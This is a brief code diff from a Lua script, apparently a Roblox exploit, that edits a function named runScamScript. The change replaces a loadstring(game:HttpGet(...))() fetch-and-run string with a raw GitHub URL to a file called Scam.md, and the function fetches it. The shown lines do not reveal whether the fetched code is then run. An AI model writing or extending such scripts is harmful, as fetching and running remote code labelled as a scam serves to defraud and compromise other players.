@@ -152,7 +152,7 @@ end
 
 -- Scam script
 local function runScamScript()
-    local url = "loadstring(game:HttpGet(('https://raw.githubusercontent.com/Rheingold59/Pop-it-trading/refs/heads/main/Scam.md'),true))()"
+    local url = "https://raw.githubusercontent.com/Rheingold59/Pop-it-trading/refs/heads/main/Scam.md"
     local success, result = pcall(function()
         return game:HttpGet(url)
     end)
